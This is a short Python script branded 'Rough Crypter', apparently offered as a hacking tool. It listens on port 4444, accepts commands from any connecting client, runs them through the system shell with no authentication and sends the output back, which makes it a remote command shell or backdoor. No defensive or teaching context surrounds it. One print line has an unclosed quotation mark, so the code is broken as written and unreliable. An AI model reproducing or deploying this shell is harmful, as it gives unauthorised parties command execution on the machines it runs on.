import os
import socket
import subprocess

print("Rough Crypter")
print("roughcrypter786@gmail.com)

# Server configuration
SERVER_HOST = 'localhost'
SERVER_PORT = 4444

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(1)

print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")

while True:
    client_socket, address = server_socket.accept()
    print(f"[+] {address} connected.")

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        client_socket.send(output.stdout)

    client_socket.close()
